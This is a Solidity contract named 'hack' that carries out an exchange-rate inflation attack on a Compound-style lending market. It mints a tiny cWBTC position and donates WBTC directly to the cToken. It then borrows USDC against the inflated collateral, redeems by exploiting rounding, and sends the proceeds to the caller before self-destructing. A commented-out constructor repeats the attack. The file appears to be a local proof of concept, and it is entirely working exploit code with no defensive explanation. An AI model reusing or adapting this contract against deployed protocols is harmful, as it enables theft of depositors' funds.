// SPDX-License-Identifier: AGPL
pragma solidity ^0.8.9;
import "./compound/CErc20.sol";
import "./compound/Comptroller.sol";
import "./compound/Linkoracle.sol";
import "hardhat/console.sol";

contract hack{
    // constructor(
    //     Comptroller comp,
    //     address[] memory cTokens,
    //     CErc20 cWBTC,
    //     CErc20 WBTC,
    //     CErc20 cUSDC,
    //     CErc20 USDC
    // ){
    //     address sender=msg.sender;
    //     uint256 u_balance=USDC.balanceOf(sender);
    //     comp.enterMarkets(cTokens);
    //     WBTC.approve(address(cWBTC), 2 ** 250);
    //     WBTC.transfer(address(this), 10**13);
    //     // WBTC.transferFrom(sender,address(this), 10**13);
    //     cWBTC.mint(10**6);
    //     console.log(cWBTC.exchangeRateStored());
    //     cWBTC.redeem(cWBTC.balanceOf(address(this)) - 1);
    //     console.log(cWBTC.exchangeRateStored());
    //     WBTC.transfer(address(cWBTC),10**12);
    //     console.log(cWBTC.exchangeRateStored());
    //     cUSDC.borrow(10000);
    //     uint256 exchange = cWBTC.exchangeRateStored() /10**18;
    //     cWBTC.mint(exchange * 2 + 2);
    //     cWBTC.redeemUnderlying(exchange * 3 - 1);
    //     USDC.transfer(sender, USDC.balanceOf(address(this)));
    //     WBTC.transfer(sender, WBTC.balanceOf(address(this)));
    //     require(u_balance<USDC.balanceOf(sender),"error balanceOf");
    //     selfdestruct(payable(sender));
    // }
    function attack(
        Comptroller comp,
        address[] memory cTokens,
        CErc20 cWBTC,
        CErc20 WBTC,
        CErc20 cUSDC,
        CErc20 USDC
    )public{
        address sender=msg.sender;
        uint256 u_balance=USDC.balanceOf(sender);
        comp.enterMarkets(cTokens);
        WBTC.approve(address(cWBTC), 2 ** 250);
        WBTC.transferFrom(sender,address(this), 10**13);
        cWBTC.mint(10**6);
        console.log(cWBTC.exchangeRateStored());
        // cWBTC.redeem(cWBTC.balanceOf(address(this)) - 1);
        console.log(cWBTC.exchangeRateStored());
        WBTC.transfer(address(cWBTC),10**12);
        console.log(cWBTC.exchangeRateStored());
        cUSDC.borrow(10000);
        uint256 exchange = cWBTC.exchangeRateStored() /10**18;
        cWBTC.mint(exchange * 2 + 2);
        cWBTC.redeemUnderlying(exchange * 3 - 1);
        USDC.transfer(sender, USDC.balanceOf(address(this)));
        WBTC.transfer(sender, WBTC.balanceOf(address(this)));
        require(u_balance<USDC.balanceOf(sender),"error balanceOf");
        selfdestruct(payable(sender));
    }
}